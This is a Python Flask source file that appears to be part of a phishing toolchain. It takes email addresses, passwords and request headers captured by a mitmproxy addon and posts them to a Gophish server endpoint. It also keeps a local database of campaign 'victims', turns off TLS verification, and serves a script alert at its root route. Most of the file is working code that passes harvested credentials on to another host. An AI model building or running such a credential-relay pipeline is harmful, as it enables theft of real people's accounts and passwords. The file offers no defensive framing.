from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from gophish import Gophish
import requests
import settings as s

"""
Creating Flask App for an API to send credentials gather from mitmproxy to Gophish
"""
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///User.sqlite3'
app.config['SECRET_KEY'] = "FSociety99"

"""
SQLAlchemy is used for creating a local database with the users/victims of out gophish campaigns

"""
db = SQLAlchemy(app)

"""
Class User - User or Victim contains the ResultID of gophish and the email
"""


class User(db.Model):
    id = db.Column(db.String(10), primary_key=True)
    email = db.Column(db.String(100))

    def __init__(self, id, email):
        self.id = id
        self.email = email


db.create_all()
"""
Gophish configs
"""
api_key = s.GOPHISH_APIKEY
api = Gophish(api_key, verify=False)

"""
Iterate all the campaigns to add or update all the users into the local database

"""
for campaign in api.campaigns.get():
    for result in campaign.results:
        go_user = result.as_dict()
        # Validate user exists in the local database
        if User.query.filter_by(email=go_user['email']).first() == None:
            user = User(go_user['id'], go_user['email'])
            db.session.add(user)
            db.session.commit()
        else:
            # Updates ID in case the user already exists
            print('Updating IDs')
            user = User.query.filter_by(email=go_user['email']).first()
            user.id = go_user['id']
            db.session.commit()

"""
API Routes

"""


@app.route('/')
def hello_world():
    return '<script>alert(3);</script>'


"""
Post will receive data from the mitmproxy addon with the information we need to send to gophish.
The local database is used to retrieve the rid of the user in gophish.

Important data:
- Headers
- Email
- Password
- RID
"""


@app.route('/post', methods=["POST"])
def post():
    input_json = request.get_json(force=True)
    password1 = input_json['password']
    email = input_json['email']
    headers = input_json['headers']
    user = User.query.filter_by(email=input_json['email']).first()
    data1 = 'UsernameForm='+email+'&password='+password1
    response = requests.post(
        s.GOPHISH_ENDPOINT+'?rid='+user.id, headers=headers, data=data1, verify=False)
    return response.status_code
